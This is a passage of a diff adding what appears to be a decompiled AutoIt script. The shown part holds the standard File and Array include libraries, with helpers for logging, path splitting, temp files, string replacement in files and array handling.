+		SetError(2)
+		Return 0
+	EndIf
+	; determine last entry
+	Local $last = UBound($a_Array) - 1
+	If $i_UBound < 1 Or $i_UBound > $last Then $i_UBound = $last
+	If $i_Base < 0 Or $i_Base > $last Then $i_Base = 0
+	; Open output file
+	$hFile = FileOpen($sFilePath, 2)
+
+	If $hFile = -1 Then
+		SetError(1)
+		Return 0
+	EndIf
+	;
+	FileWrite($hFile, $a_Array[$i_Base])
+	For $x = $i_Base + 1 To $i_UBound
+		FileWrite($hFile, @CRLF & $a_Array[$x])
+	Next
+
+	FileClose($hFile)
+	Return 1
+EndFunc   ;==>_FileWriteFromArray
+
+;===============================================================================
+;
+; Description:      Writes the specified text to a log file.
+; Syntax:           _FileWriteLog( $sLogPath, $sLogMsg )
+; Parameter(s):     $sLogPath - Path and filename to the log file
+;                   $sLogMsg  - Message to be written to the log file
+; Requirement(s):   None
+; Return Value(s):  On Success - Returns 1
+;                   On Failure - Returns 0 and sets:
+;                                @error = 1: Error opening specified file
+;                                @error = 2: File could not be written to
+; Author(s):        Jeremy Landes <jlandes at landeserve dot com>
+; Note(s):          If the text to be appended does NOT end in @CR or @LF then
+;                   a DOS linefeed (@CRLF) will be automatically added.
+;
+;===============================================================================
+Func _FileWriteLog($sLogPath, $sLogMsg)
+	;==============================================
+	; Local Constant/Variable Declaration Section
+	;==============================================
+	Local $sDateNow
+	Local $sTimeNow
+	Local $sMsg
+	Local $hOpenFile
+	Local $hWriteFile
+
+	$sDateNow = @YEAR & "-" & @MON & "-" & @MDAY
+	$sTimeNow = @HOUR & ":" & @MIN & ":" & @SEC
+	$sMsg = $sDateNow & " " & $sTimeNow & " : " & $sLogMsg
+
+	$hOpenFile = FileOpen($sLogPath, 1)
+
+	If $hOpenFile = -1 Then
+		SetError(1)
+		Return 0
+	EndIf
+
+	$hWriteFile = FileWriteLine($hOpenFile, $sMsg)
+
+	If $hWriteFile = -1 Then
+		SetError(2)
+		Return 0
+	EndIf
+
+	FileClose($hOpenFile)
+	Return 1
+EndFunc   ;==>_FileWriteLog
+
+;========================================
+;Function name:       _FileWriteToLine
+;Description:         Write text to specified line in a file
+;Parameters:
+;                     $sFile - The file to write to
+;                     $iLine - The line number to write to
+;                     $sText - The text to write
+;                     $fOverWrite - if set to 1 will overwrite the old line
+;                     if set to 0 will not overwrite
+;Requirement(s):      None
+;Return Value(s):     On success - 1
+;                      On Failure - 0 And sets @ERROR
+;                                @ERROR = 1 - File has less lines than $iLine
+;                                @ERROR = 2 - File does not exist
+;                                @ERROR = 3 - Error opening file
+;                                @ERROR = 4 - $iLine is invalid
+;                                @ERROR = 5 - $fOverWrite is invalid
+;                                @ERROR = 6 - $sText is invalid
+;Author(s):           cdkid
+;Note(s):
+;=========================================
+Func _FileWriteToLine($sFile, $iLine, $sText, $fOverWrite = 0)
+	If $iLine <= 0 Then
+		SetError(4)
+		Return 0
+	EndIf
+	If Not IsString($sText) Then
+		SetError(6)
+		Return 0
+	EndIf
+	If $fOverWrite <> 0 And $fOverWrite <> 1 Then
+		SetError(5)
+		Return 0
+	EndIf
+	If Not FileExists($sFile) Then
+		SetError(2)
+		Return 0
+	EndIf
+	Local $filtxt = FileRead($sFile, FileGetSize($sFile))
+	$filtxt = StringSplit($filtxt, @CRLF, 1)
+	If UBound($filtxt, 1) < $iLine Then
+		SetError(1)
+		Return 0
+	EndIf
+	Local $fil = FileOpen($sFile, 2)
+	If $fil = -1 Then
+		SetError(3)
+		Return 0
+	EndIf
+	For $i = 1 To UBound($filtxt) - 1
+		If $i = $iLine Then
+			If $fOverWrite = 1 Then
+				If $sText <> '' Then
+					FileWrite($fil, $sText & @CRLF)
+				Else
+					FileWrite($fil, $sText)
+				EndIf
+			EndIf
+			If $fOverWrite = 0 Then
+				FileWrite($fil, $sText & @CRLF)
+				FileWrite($fil, $filtxt[$i] & @CRLF)
+			EndIf
+		ElseIf $i < UBound($filtxt, 1) - 1 Then
+			FileWrite($fil, $filtxt[$i] & @CRLF)
+		ElseIf $i = UBound($filtxt, 1) - 1 Then
+			FileWrite($fil, $filtxt[$i])
+		EndIf
+	Next
+	FileClose($fil)
+	Return 1
+EndFunc   ;==>_FileWriteToLine
+
+;===============================================================================
+;
+; Description:      Treats ..\ as Returns a path after processing the directory change operator .. to move the path up
+;                                one level.
+; Syntax:           _PathFull($sRelativePath, $sBasePath = @WorkingDir)
+; Parameter(s):     $sRelativePath - The path to process.
+;                            $sBasePath$sType - A base path to use if an absolute path is not provided.  This defaults to the
+;                                current working directory.
+; Requirement(s):   None
+; Return Value(s):  The expanded path, the root drive or $sBasePath depending on how it's called.
+; Author(s):        Valik (Original function and modification to rewrite)
+;                        tittoproject (Rewrite)
+; Note(s):          UNC paths are supported.
+;                   Pass "\" to get the root drive of $sBasePath.
+;                   Pass "" or "." to return $sBasePath.
+;                   A relative path will be built relative to $sBasePath.  To bypass this behavior, use an absolute path.
+;
+;===============================================================================
+Func _PathFull($sRelativePath, $sBasePath = @WorkingDir)
+	If Not $sRelativePath Or $sRelativePath = "." Then Return $sBasePath
+
+	; Normalize slash direction.
+	Local $sFullPath = StringReplace($sRelativePath, "/", "\")
+	Local $sPath = StringLeft($sFullPath, 2)
+
+	; Check to see if the path is all slashes.  If so, return the root drive.
+	StringReplace($sFullPath, "\", "")
+	If @extended = StringLen($sFullPath) Then Return StringLeft($sBasePath, 2) & "\"
+
+	; Check for UNC paths or local drives.
+	If StringLeft($sFullPath, 1) = "\" Then
+		If $sPath = "\\" Then
+			$sFullPath = StringTrimLeft($sFullPath, 2)
+			$sPath &= StringLeft($sFullPath, StringInStr($sFullPath, "\") - 1)
+		Else
+			$sPath = StringLeft($sBasePath, 2)
+		EndIf
+	ElseIf Not StringInStr($sPath, ":") Then
+		$sFullPath = $sBasePath & "\" & $sFullPath
+		$sPath = StringLeft($sBasePath, 2)
+	EndIf
+
+	; Build an array of the path parts we want to use.
+	Local $aTemp = StringSplit($sFullPath, "\")
+	Local $aPathParts[$aTemp[0]], $j = 0
+	For $i = 2 To $aTemp[0]
+		If $aTemp[$i] = ".." Then
+			If $j Then $j -= 1
+		ElseIf Not ($aTemp[$i] = "" And $i <> $aTemp[0]) And $aTemp[$i] <> "." Then
+			$aPathParts[$j] = $aTemp[$i]
+			$j += 1
+		EndIf
+	Next
+
+	; Build the path from the parts.
+	$sFullPath = $sPath
+	For $i = 0 To $j - 1
+		$sFullPath &= "\" & $aPathParts[$i]
+	Next
+
+	; Clean up the path.
+	While StringInStr($sFullPath, ".\")
+		$sFullPath = StringReplace($sFullPath, ".\", "\")
+	WEnd
+	Return $sFullPath
+EndFunc   ;==>_PathFull
+
+; ===================================================================
+; Author: Valik
+;
+; _PathMake($szDrive, $szDir, $szFName, $szExt)
+;
+; Creates a string containing the path from drive, directory, file name and file extension parts.  Not all parts must be
+;	passed. The path will still be built with what is passed.  This doesn't check the validity of the path
+;	created, it could contain characters which are invalid on your filesystem.
+; Parameters:
+; 	$szDrive - IN - Drive (Can be UNC).  If it's a drive letter, a : is automatically appended
+; 	$szDir - IN - Directory.  A trailing slash is added if not found (No preceeding slash is added)
+; 	$szFName - IN - The name of the file
+; 	$szExt - IN - The file extension.  A period is supplied if not found in the extension
+; Returns:
+;	The string for the newly created path
+; ===================================================================
+Func _PathMake($szDrive, $szDir, $szFName, $szExt)
+	; Format $szDrive, if it's not a UNC server name, then just get the drive letter and add a colon
+	Local $szFullPath
+	;
+	If StringLen($szDrive) Then
+		If Not (StringLeft($szDrive, 2) = "\\") Then $szDrive = StringLeft($szDrive, 1) & ":"
+	EndIf
+
+	; Format the directory by adding any necessary slashes
+	If StringLen($szDir) Then
+		If Not (StringRight($szDir, 1) = "\") And Not (StringRight($szDir, 1) = "/") Then $szDir = $szDir & "\"
+	EndIf
+
+	; Nothing to be done for the filename
+
+	; Add the period to the extension if necessary
+	If StringLen($szExt) Then
+		If Not (StringLeft($szExt, 1) = ".") Then $szExt = "." & $szExt
+	EndIf
+
+	$szFullPath = $szDrive & $szDir & $szFName & $szExt
+	Return $szFullPath
+EndFunc   ;==>_PathMake
+
+; ===================================================================
+; Author: Valik
+;
+; _PathSplit($szPath, ByRef $szDrive, ByRef $szDir, ByRef $szFName, ByRef $szExt)
+;
+; Splits a path into the drive, directory, file name and file extension parts.  An empty string is set if a
+;	part is missing.
+; Parameters:
+;	$szPath - IN - The path to be split (Can contain a UNC server or drive letter)
+;	$szDrive - OUT - String to hold the drive
+; 	$szDir - OUT - String to hold the directory
+; 	$szFName - OUT - String to hold the file name
+; 	$szExt - OUT - String to hold the file extension
+; Returns:
+;	Array with 5 elements where 0 = original path, 1 = drive, 2 = directory, 3 = filename, 4 = extension
+; ===================================================================
+Func _PathSplit($szPath, ByRef $szDrive, ByRef $szDir, ByRef $szFName, ByRef $szExt)
+	; Set local strings to null (We use local strings in case one of the arguments is the same variable)
+	Local $drive = ""
+	Local $dir = ""
+	Local $fname = ""
+	Local $ext = ""
+	Local $pos
+
+	; Create an array which will be filled and returned later
+	Local $array[5]
+	$array[0] = $szPath; $szPath can get destroyed, so it needs set now
+
+	; Get drive letter if present (Can be a UNC server)
+	If StringMid($szPath, 2, 1) = ":" Then
+		$drive = StringLeft($szPath, 2)
+		$szPath = StringTrimLeft($szPath, 2)
+	ElseIf StringLeft($szPath, 2) = "\\" Then
+		$szPath = StringTrimLeft($szPath, 2) ; Trim the \\
+		$pos = StringInStr($szPath, "\")
+		If $pos = 0 Then $pos = StringInStr($szPath, "/")
+		If $pos = 0 Then
+			$drive = "\\" & $szPath; Prepend the \\ we stripped earlier
+			$szPath = ""; Set to null because the whole path was just the UNC server name
+		Else
+			$drive = "\\" & StringLeft($szPath, $pos - 1) ; Prepend the \\ we stripped earlier
+			$szPath = StringTrimLeft($szPath, $pos - 1)
+		EndIf
+	EndIf
+
+	; Set the directory and file name if present
+	Local $nPosForward = StringInStr($szPath, "/", 0, -1)
+	Local $nPosBackward = StringInStr($szPath, "\", 0, -1)
+	If $nPosForward >= $nPosBackward Then
+		$pos = $nPosForward
+	Else
+		$pos = $nPosBackward
+	EndIf
+	$dir = StringLeft($szPath, $pos)
+	$fname = StringRight($szPath, StringLen($szPath) - $pos)
+
+	; If $szDir wasn't set, then the whole path must just be a file, so set the filename
+	If StringLen($dir) = 0 Then $fname = $szPath
+
+	$pos = StringInStr($fname, ".", 0, -1)
+	If $pos Then
+		$ext = StringRight($fname, StringLen($fname) - ($pos - 1))
+		$fname = StringLeft($fname, $pos - 1)
+	EndIf
+
+	; Set the strings and array to what we found
+	$szDrive = $drive
+	$szDir = $dir
+	$szFName = $fname
+	$szExt = $ext
+	$array[1] = $drive
+	$array[2] = $dir
+	$array[3] = $fname
+	$array[4] = $ext
+	Return $array
+EndFunc   ;==>_PathSplit
+
+; ===================================================================
+; Author: Kurt (aka /dev/null) and JdeB
+;
+; _ReplaceStringInFile($szFileName, $szSearchString, $szReplaceString,$bCaseness = 0, $bOccurance = 0)
+;
+; Replaces a string ($szSearchString) with another string ($szReplaceString) the given TEXT file
+; (via filename)
+;
+; Operation:
+; The funnction opens the original file for reading and a temp file for writing. Then
+; it reads in all lines and searches for the string. If it was found, the original line will be
+; modified and written to the temp file. If the string was not found, the original line will be
+; written to the temp file. At the end the original file will be deleted and the temp file will
+; be renamed.
+;
+; Parameters:
+; 	$szFileName 		name of the file to open.
+;				ATTENTION !! Needs the FULL path, not just the name returned by eg. FileFindNextFile
+; 	$szSearchString		The string we want to replace in the file
+; 	$szReplaceString	The string we want as a replacement for $szSearchString
+; 	$fCaseness		shall case matter?
+;				0 = NO, case doe not matter (default), 1 = YES, case does matter
+;	$fOccurance		shall we replace the string in every line or just the first occurance
+;				0 = first only, 1 = ALL strings (default)
+;
+; Return Value(s):
+;	On Success 		Returns the number of occurences of $szSearchString we found
+;
+;	On Failure 		Returns -1 sets @error
+;					@error=1	Cannot open file
+;					@error=2	Cannot open temp file
+;					@error=3	Cannot write to temp file
+;					@error=4	Cannot delete original file
+;					@error=5	Cannot rename/move temp file
+;
+; ===================================================================
+Func _ReplaceStringInFile($szFileName, $szSearchString, $szReplaceString, $fCaseness = 0, $fOccurance = 1)
+
+	Local $iRetVal = 0
+	Local $szTempFile, $hWriteHandle, $aFileLines, $nCount, $sEndsWith, $hFile
+	;===============================================================================
+	;== Read the file into an array
+	;===============================================================================
+	$hFile = FileOpen($szFileName, 0)
+	If $hFile = -1 Then
+		SetError(1)
+		Return -1
+	EndIf
+	Local $s_TotFile = FileRead($hFile, FileGetSize($szFileName))
+	If StringRight($s_TotFile, 2) = @CRLF Then
+		$sEndsWith = @CRLF
+	ElseIf StringRight($s_TotFile, 1) = @CR Then
+		$sEndsWith = @CR
+	ElseIf StringRight($s_TotFile, 1) = @LF Then
+		$sEndsWith = @LF
+	Else
+		$sEndsWith = ""
+	EndIf
+	$aFileLines = StringSplit(StringStripCR($s_TotFile), @LF)
+	FileClose($hFile)
+	;===============================================================================
+	;== Open the temporary file in write mode
+	;===============================================================================
+	$szTempFile = _TempFile()
+
+	$hWriteHandle = FileOpen($szTempFile, 2)
+	If $hWriteHandle = -1 Then
+		SetError(2)
+		Return -1
+	EndIf
+	;===============================================================================
+	;== Loop through the array and search for $szSearchString
+	;===============================================================================
+	For $nCount = 1 To $aFileLines[0]
+		If StringInStr($aFileLines[$nCount], $szSearchString, $fCaseness) Then
+			$aFileLines[$nCount] = StringReplace($aFileLines[$nCount], $szSearchString, $szReplaceString, 1 - $fOccurance, $fCaseness)
+			$iRetVal = $iRetVal + 1
+
+			;======================================================================
+			;== If we want just the first string replaced, copy the rest of the lines
+			;== and stop
+			;======================================================================
+			If $fOccurance = 0 Then
+				$iRetVal = 1
+				ExitLoop
+			EndIf
+		EndIf
+	Next
+	;===============================================================================
+	;== Write the lines to a temp file.
+	;===============================================================================
+	For $nCount = 1 To $aFileLines[0] - 1
+		If FileWriteLine($hWriteHandle, $aFileLines[$nCount]) = 0 Then
+			SetError(3)
+			FileClose($hWriteHandle)
+			Return -1
+		EndIf
+	Next
+	; Write the last record and ensure it ends wit hthe same as the input file
+	If $aFileLines[$nCount] <> "" Then FileWrite($hWriteHandle, $aFileLines[$nCount] & $sEndsWith)
+	FileClose($hWriteHandle)
+
+	;======================================================================
+	;== Delete the original file
+	;======================================================================
+	If FileDelete($szFileName) = 0 Then
+		SetError(4)
+		Return -1
+	EndIf
+
+	;======================================================================
+	;== Rename the temp file to the original file
+	;======================================================================
+	If FileMove($szTempFile, $szFileName) = 0 Then
+		SetError(5)
+		Return -1
+	EndIf
+
+	Return $iRetVal
+EndFunc   ;==>_ReplaceStringInFile
+
+;========================================================================================================
+;
+; Function Name:    _TempFile([s_DirectoryName],[s_FilePrefix], [s_FileExtension], [i_RandomLength)
+; Description:      Generate a name for a temporary file. The file is guaranteed not to already exist.
+; Parameter(s):
+;     $s_DirectoryName    optional  Name of directory for filename, defaults to @TempDir
+;     $s_FilePrefix       optional  File prefixname, defaults to "~"
+;     $s_FileExtension    optional  File extenstion, defaults to ".tmp"
+;     $i_RandomLength     optional  Number of characters to use to generate a unique name, defaults to 7
+; Requirement(s):   None.
+; Return Value(s):  Filename of a temporary file which does not exist.
+; Author(s):        Dale (Klaatu) Thompson
+;                   Hans Harder - Added Optional parameters
+; Notes:            None.
+;
+;========================================================================================================
+Func _TempFile($s_DirectoryName = @TempDir, $s_FilePrefix = "~", $s_FileExtension = ".tmp", $i_RandomLength = 7)
+	Local $s_TempName
+	; Check parameters
+	If Not FileExists($s_DirectoryName) Then $s_DirectoryName = @TempDir   ; First reset to default temp dir
+	If Not FileExists($s_DirectoryName) Then $s_DirectoryName = @ScriptDir ; Still wrong then set to Scriptdir
+	; add trailing \ for directory name
+	If StringRight($s_DirectoryName, 1) <> "\" Then $s_DirectoryName = $s_DirectoryName & "\"
+	;
+	Do
+		$s_TempName = ""
+		While StringLen($s_TempName) < $i_RandomLength
+			$s_TempName = $s_TempName & Chr(Random(97, 122, 1))
+		WEnd
+		$s_TempName = $s_DirectoryName & $s_FilePrefix & $s_TempName & $s_FileExtension
+	Until Not FileExists($s_TempName)
+
+	Return ($s_TempName)
+EndFunc   ;==>_TempFile
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-END: C:\Dokumente und Einstellungen\root\Desktop\spread\include\File.au3>
+; ----------------------------------------------------------------------------
+
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-START: C:\Dokumente und Einstellungen\root\Desktop\spread\include\uptime.au3>
+; ----------------------------------------------------------------------------
+
+
+; ----------------------------------------------------------------------------
+; <AUT2EXE INCLUDE-START: C:\Dokumente und Einstellungen\root\Desktop\spread\Include\array.au3>
+; ----------------------------------------------------------------------------
+
+
+; ------------------------------------------------------------------------------
+;
+; AutoIt Version: 3.0
+; Language:       English
+; Description:    Functions that assist with array management.
+;
+; Apr 28, 2005 - Fixed _ArrayTrim(): $iTrimDirection test.
+; ------------------------------------------------------------------------------
+
+
+
+
+;===============================================================================
+;
+; Function Name:  _ArrayAdd()
+; Description:    Adds a specified value at the end of an array, returning the
+;                 adjusted array.
+; Author(s):      Jos van der Zande <jdeb at autoitscript dot com>
+;
+;===============================================================================
+Func _ArrayAdd(ByRef $avArray, $sValue)
+	If IsArray($avArray) Then
+		ReDim $avArray[UBound($avArray) + 1]
+		$avArray[UBound($avArray) - 1] = $sValue
+		SetError(0)
+		Return 1
+	Else
+		SetError(1)
+		Return 0
+	EndIf
+EndFunc   ;==>_ArrayAdd
+
+
+;===============================================================================
+;
+; Function Name:  _ArrayBinarySearch()
+; Description:    Uses the binary search algorithm to search through a
+;                 1-dimensional array.
+; Author(s):      Jos van der Zande <jdeb at autoitscript dot com>
+;
+;===============================================================================
+Func _ArrayBinarySearch(ByRef $avArray, $sKey, $i_Base = 0)
+	Local $iLwrLimit = $i_Base
+	Local $iUprLimit
+	Local $iMidElement
+
+	If (Not IsArray($avArray)) Then
+		SetError(1)
+		Return ""
+	EndIf
+	$iUprLimit = UBound($avArray) - 1
+	$iMidElement = Int( ($iUprLimit + $iLwrLimit) / 2)
+	; sKey is smaller than the first entry
+	If $avArray[$iLwrLimit] > $sKey Or $avArray[$iUprLimit] < $sKey Then
+		SetError(2)
+		Return ""
+	EndIf
+
+	While $iLwrLimit <= $iMidElement And $sKey <> $avArray[$iMidElement]
+		If $sKey < $avArray[$iMidElement] Then
+			$iUprLimit = $iMidElement - 1
+		Else
+			$iLwrLimit = $iMidElement + 1
+		EndIf
+		$iMidElement = Int( ($iUprLimit + $iLwrLimit) / 2)
+	WEnd
+	If $iLwrLimit > $iUprLimit Then
+		; Entry not found
+		SetError(3)
+		Return ""
+	Else
+		;Entry found , return the index
+		SetError(0)
+		Return $iMidElement
+	EndIf
+EndFunc   ;==>_ArrayBinarySearch
+
+;===============================================================================
+;
+; Function Name:    _ArrayCreate()
+; Description:      Create a small array and quickly assign values.
+; Parameter(s):     $v_0  - The first element of the array.
+;                   $v_1  - The second element of the array (optional).
+;                   ...
+;                   $v_20 - The twentyfirst element of the array (optional).
+; Requirement(s):   None.
+; Return Value(s):  The array with values.
+; Author(s):        Dale (Klaatu) Thompson
+; Note(s):          None.
+;
+;===============================================================================
+Func _ArrayCreate($v_0, $v_1 = 0, $v_2 = 0, $v_3 = 0, $v_4 = 0, $v_5 = 0, $v_6 = 0, $v_7 = 0, $v_8 = 0, $v_9 = 0, $v_10 = 0, $v_11 = 0, $v_12 = 0, $v_13 = 0, $v_14 = 0, $v_15 = 0, $v_16 = 0, $v_17 = 0, $v_18 = 0, $v_19 = 0, $v_20 = 0)
+
+	Local $i_UBound = @NumParams
+	Local $av_Array[$i_UBound]
+	Local $i_Index
+
+	For $i_Index = 0 To ($i_UBound - 1)
+		$av_Array[$i_Index] = Eval("v_" & String($i_Index))
+	Next
+	Return $av_Array
+	; Create fake usage for the variables to suppress Au3Check -w 6
+	$v_0 = $v_0 = $v_1 = $v_2 = $v_3 = $v_4 = $v_5 = $v_6 = $v_7 = $v_8 = $v_9 = $v_10
+    $v_11 = $v_11 = $v_12 = $v_13 = $v_14 = $v_15 = $v_16 = $v_17 = $v_18 = $v_19 = $v_20
+EndFunc   ;==>_ArrayCreate
+
+
+;===============================================================================
+;
+; Function Name:  _ArrayDelete()
+; Description:    Deletes the specified element from the given array, returning
+;                 the adjusted array.
+; Author(s)       Cephas <cephas at clergy dot net>
+; Modifications   Array is passed via Byref  - Jos van der zande
+;===============================================================================
+Func _ArrayDelete(ByRef $avArray, $iElement)
+	Local $iCntr = 0, $iUpper = 0
+
+	If (Not IsArray($avArray)) Then
+		SetError(1)
+		Return ""
+	EndIf
+
+	; We have to define this here so that we're sure that $avArray is an array
+	; before we get it's size.
+	$iUpper = UBound($avArray)    ; Size of original array
+
+	; If the array is only 1 element in size then we can't delete the 1 element.
+	If $iUpper = 1 Then
+		SetError(2)
+		Return ""
+	EndIf
+
+	Local $avNewArray[$iUpper - 1]
+	If $iElement < 0 Then
+		$iElement = 0
+	EndIf
+	If $iElement > ($iUpper - 1) Then
+		$iElement = ($iUpper - 1)
+	EndIf
+	If $iElement > 0 Then
+		For $iCntr = 0 To $iElement - 1
+			$avNewArray[$iCntr] = $avArray[$iCntr]
+		Next
+	EndIf
+	If $iElement < ($iUpper - 1) Then
+		For $iCntr = ($iElement + 1) To ($iUpper - 1)
+			$avNewArray[$iCntr - 1] = $avArray[$iCntr]
+		Next
+	EndIf
+	$avArray = $avNewArray
+	SetError(0)
+	Return 1
+EndFunc   ;==>_ArrayDelete
+
+
+;===============================================================================
+;
+; Function Name:  _ArrayDisplay()
+; Description:    Displays a 1-dimensional array in a message box.
+; Author(s):      Brian Keene <brian_keene at yahoo dot com>
+;
+;===============================================================================
+Func _ArrayDisplay(Const ByRef $avArray, $sTitle)
+	Local $iCounter = 0, $sMsg = ""
+
+	If (Not IsArray($avArray)) Then
+		SetError(1)
+		Return 0
+	EndIf
+
+	For $iCounter = 0 To UBound($avArray) - 1
+		$sMsg = $sMsg & "[" & $iCounter & "]    = " & StringStripCR($avArray[$iCounter]) & @CR
+	Next
+
+	MsgBox(4096, $sTitle, $sMsg)
+	SetError(0)
+	Return 1
+EndFunc   ;==>_ArrayDisplay
+
+
+;===============================================================================
+;
+; Function Name:  _ArrayInsert()
+; Description:    Add a new value at the specified position.
+;
+; Author(s):      Jos van der Zande <jdeb at autoitscript dot com>
+;
+;===============================================================================
+Func _ArrayInsert(ByRef $avArray, $iElement, $sValue = "")
+	Local $iCntr = 0
+
+	If Not IsArray($avArray) Then
+		SetError(1)
+		Return 0
+	EndIf
+	; Add 1 to the Array
+	ReDim $avArray[UBound($avArray) + 1]
+	; Move all entries one up till the specified Element
+	For $iCntr = UBound($avArray) - 1 To $iElement + 1 Step - 1
+		$avArray[$iCntr] = $avArray[$iCntr - 1]
+	Next
+	; add the value in the specified element
+	$avArray[$iCntr] = $sValue
+	Return 1
+EndFunc   ;==>_ArrayInsert
+
+
+;===============================================================================
+;
+; Function Name:  _ArrayMax()
+; Description:    Returns the highest value held in an array.
+; Author(s):      Cephas <cephas at clergy dot net>
+;
+;                 Jos van der Zande
+; Modified:       Added $iCompNumeric and $i_Base parameters and logic
+;===============================================================================
+Func _ArrayMax(Const Byref $avArray, $iCompNumeric = 0, $i_Base = 0)
+	If IsArray($avArray) Then
+		Return $avArray[_ArrayMaxIndex($avArray, $iCompNumeric, $i_Base) ]
+	Else
+		SetError(1)
+		Return ""
+	EndIf
+EndFunc   ;==>_ArrayMax
+
+
+;===============================================================================
+;
+; Function Name:  _ArrayMaxIndex()
+; Description:    Returns the index where the highest value occurs in the array.
+; Author(s):      Cephas <cephas at clergy dot net>
+;
+;                 Jos van der Zande
+; Modified:       Added $iCompNumeric and $i_Base parameters and logic
+;===============================================================================
+Func _ArrayMaxIndex(Const ByRef $avArray, $iCompNumeric = 0, $i_Base = 0)
+	Local $iCntr, $iMaxIndex = $i_Base
+
+	If Not IsArray($avArray) Then
+		SetError(1)
+		Return ""
+	EndIf
+
+	Local $iUpper = UBound($avArray)
+	For $iCntr = $i_Base To ($iUpper - 1)
+		If $iCompNumeric = 1 Then
+			If Number($avArray[$iMaxIndex]) < Number($avArray[$iCntr]) Then
+				$iMaxIndex = $iCntr
+			EndIf
+		Else
+			If $avArray[$iMaxIndex] < $avArray[$iCntr] Then
+				$iMaxIndex = $iCntr
+			EndIf
+		EndIf
+	Next
+	SetError(0)
+	Return $iMaxIndex
+EndFunc   ;==>_ArrayMaxIndex
+
+
+;===============================================================================
+;
+; Function Name:  _ArrayMin()
+; Description:    Returns the lowest value held in an array.
+; Author(s):      Cephas <cephas ay clergy dot net>
+;
+;                 Jos van der Zande
+; Modified:       Added $iCompNumeric and $i_Base parameters and logic
+;===============================================================================
+Func _ArrayMin(Const ByRef $avArray, $iCompNumeric = 0, $i_Base = 0)
+	If IsArray($avArray) Then
+		Return $avArray[_ArrayMinIndex($avArray, $iCompNumeric, $i_Base) ]
+	Else
+		SetError(1)
+		Return ""
+	EndIf
+EndFunc   ;==>_ArrayMin
+
+
+;===============================================================================
+;
+; Function Name:  _ArrayMinIndex()
+; Description:    Returns the index where the lowest value occurs in the array.
+; Author(s):      Cephas <cephas at clergy dot net>
+;
+;                 Jos van der Zande
+; Modified:       Added $iCompNumeric and $i_Base parameters and logic
+;===============================================================================
+Func _ArrayMinIndex(Const ByRef $avArray, $iCompNumeric = 0, $i_Base = 0)
+	Local $iCntr = 0, $iMinIndex = $i_Base
+
+	If Not IsArray($avArray) Then
+		SetError(1)
+		Return ""
+	EndIf
+
+	Local $iUpper = UBound($avArray)
+	For $iCntr = $i_Base To ($iUpper - 1)
+		If $iCompNumeric = 1 Then
+			If Number($avArray[$iMinIndex]) > Number($avArray[$iCntr]) Then
+				$iMinIndex = $iCntr
+			EndIf
+		Else
+			If $avArray[$iMinIndex] > $avArray[$iCntr] Then
+				$iMinIndex = $iCntr
+			EndIf
+		EndIf
+	Next
+	SetError(0)
+	Return $iMinIndex
+EndFunc   ;==>_ArrayMinIndex
+
+
+;===============================================================================
+;
+; Function Name:  _ArrayPop()
+; Description:    Returns the last element of an array, deleting that element
+;                 from the array at the same time.
+; Author(s):      Cephas <cephas at clergy dot net>
+; Modified:       Use Redim to remove last entry.
+;===============================================================================
+Func _ArrayPop(ByRef $avArray)
+	Local $sLastVal
+	If (Not IsArray($avArray)) Then
+		SetError(1)
+		Return ""
+	EndIf
+	$sLastVal = $avArray[UBound($avArray) - 1]
+	; remove the last value
+	If UBound($avArray) = 1 Then
+		$avArray = ""
+	Else
+		ReDim $avArray[UBound($avArray) - 1]
+	EndIf
+	; return last value
+	Return $sLastVal
+EndFunc   ;==>_ArrayPop
+
+;=====================================================================================
+;
+; Function Name:    _ArrayPush
+; Description:      Add new values without increasing array size.Either by inserting
+;                   at the end the new value and deleting the first one or vice versa.
+; Parameter(s):     $avArray      - Array
+;                   $sValue       - The new value.It can be an array too.
+;                   $i_Direction  - 0 = Leftwise slide (adding at the end) (default)
+;                                   1 = Rightwise slide (adding at the start)
+; Requirement(s):   None
+; Return Value(s):  On Success -  Returns 1
+;                   On Failure -  0 if $avArray is not an array.
+;								 -1 if $sValue array size is greater than $avArray size.
+;								 In both cases @error is set to 1.
+; Author(s):        Helias Gerassimou(hgeras)
+;
+;======================================================================================
+Func _ArrayPush(ByRef $avArray, $sValue, $i_Direction = 0)
+	Local $i, $j
+
+	If (Not IsArray($avArray)) Then
+		SetError(1)
+		Return 0
+	EndIf
+;
+	If (Not IsArray($sValue)) Then
+		If $i_Direction = 1 Then
+			For $i = (UBound($avArray) - 1) To 1 Step -1
+				$avArray[$i] = $avArray[$i - 1]
+			Next
+			$avArray[0] = $sValue
+		Else
+			For $i = 0 To (UBound($avArray) - 2)
+				$avArray[$i] = $avArray[$i + 1]
+			Next
+			$i = (UBound($avArray) - 1)
+			$avArray[$i] = $sValue
+		EndIf
+		;
+		SetError(0)
+		Return 1
+	Else
+		If UBound($sValue) > UBound($avArray) Then
+			SetError(1)
+			Return -1
+		Else
+			For $j = 0 to (UBound($sValue) - 1)
+				If $i_Direction = 1 Then
+					For $i = (UBound($avArray) - 1) To 1
+						$avArray[$i] = $avArray[$i - 1]
+					Next
+					$avArray[$j] = $sValue[$j]
+				Else
+					For $i = 0 To (UBound($avArray) - 2)
+						$avArray[$i] = $avArray[$i + 1]
+					Next
+					$i = (UBound($avArray) - 1)
+					$avArray[$i] = $sValue[$j]
+				EndIf
+			Next
+		EndIf
+	EndIf
+	;
+	SetError(0)
+	Return 1
+;
+EndFunc   ;==>_ArrayPush
+
+;===============================================================================
+;
+; Function Name:  _ArrayReverse()
+; Description:    Takes the given array and reverses the order in which the
+;                 elements appear in the array.
+; Author(s):      Brian Keene <brian_keene at yahoo dot com>
+;
+; Modified:       Added $i_Base parameter and logic (Jos van der Zande)
+;                 Added $i_UBound parameter and rewrote it for speed. (Tylo)
+;===============================================================================
+
+Func _ArrayReverse(ByRef $avArray, $i_Base = 0, $i_UBound = 0)
+    If Not IsArray($avArray) Then
+        SetError(1)
+        Return 0
+    EndIf
+    Local $tmp, $last = UBound($avArray) - 1
+    If $i_UBound < 1 Or $i_UBound > $last Then $i_UBound = $last
+    For $i = $i_Base To $i_Base + Int(($i_UBound - $i_Base - 1) / 2)
+        $tmp = $avArray[$i]
+        $avArray[$i] = $avArray[$i_UBound]
+        $avArray[$i_UBound] = $tmp
+        $i_UBound = $i_UBound - 1
+    Next
+    Return 1
+EndFunc  ;==>_ArrayReverse
+
+;===============================================================================
+;
+; Function Name:    _ArraySearch()
+; Description:      Finds an entry within a one-dimensional array. (Similar to _ArrayBinarySearch() except the array does not need to be sorted.)
